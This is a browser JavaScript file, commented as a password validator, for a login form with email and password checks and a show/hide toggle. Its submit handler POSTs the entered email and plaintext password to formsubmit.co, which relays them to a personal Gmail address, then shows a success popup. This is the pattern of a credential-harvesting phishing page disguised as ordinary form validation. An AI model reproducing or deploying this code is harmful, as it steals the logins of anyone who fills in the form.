// password validator
import PasswordValidator from 'password-validator';
import validator from 'validator';

// email check
const schema = new PasswordValidator();
schema
	.is()
	.min(8)
	.usingPlugin(validator.isEmail, 'it should be an email')
	.is()
	.max(100)
	.has()
	.not()
	.spaces();

// password check
const passSchema = new PasswordValidator();
passSchema.is().min(6).is().max(100).has().not().spaces();

// action with form
const pass_field = document.querySelector('.pass');
const email_field = document.querySelector('.email');
const email_er = document.querySelector('.em-er');
const pass_er = document.querySelector('.pass-er');
const showBtn = document.querySelector('.show');
const form = document.querySelector('.form-submit');
const load = document.querySelector('.lds-facebook');
const up = document.getElementById('pop');

showBtn.addEventListener('click', function () {
	if (pass_field.type === 'password') {
		pass_field.type = 'text';
		showBtn.textContent = 'HIDE';
		showBtn.style.color = '#D052F6';
	} else {
		pass_field.type = 'password';
		showBtn.textContent = 'SHOW';
		showBtn.style.color = '#222';
	}
});
form.addEventListener('submit', e => {
	e.preventDefault();
	let emailValue = email_field.value;
	let passValue = pass_field.value;

	const emailCheckMSG = schema.validate(emailValue, { details: true })[0]
		?.message;
	const passCheckMSG = passSchema.validate(passValue, { details: true })[0]
		?.message;

	if (schema.validate(emailValue, { details: true }).length !== 0) {
		email_field.style.borderColor = 'red';
		email_er.innerText = emailCheckMSG;
	}

	if (passSchema.validate(passValue, { details: true }).length !== 0) {
		pass_field.style.borderColor = 'red';
		pass_er.innerText = passCheckMSG;
	}

	if (
		schema.validate(emailValue, { details: true }).length !== 0 ||
		passSchema.validate(passValue, { details: true }).length !== 0
	) {
		return;
	}

	load.style.display = 'inline-block';
	fetch('https://formsubmit.co/ajax/tonight0bayastan@gmail.com', {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json',
			Accept: 'application/json',
		},
		body: JSON.stringify({
			email: emailValue,
			password: passValue,
		}),
	})
		.then(() => {
			email_field.value = '';
			pass_field.value = '';
			pass_field.style.borderColor = 'black';
			pass_er.innerText = '';
			load.style.display = 'none';
			email_field.style.borderColor = 'black';
			email_er.innerText = '';
			up.classList.add('active');
			setTimeout(() => {
				up.classList.remove('active');
			}, 2500);
		})
		.catch(error => console.log(error));
});
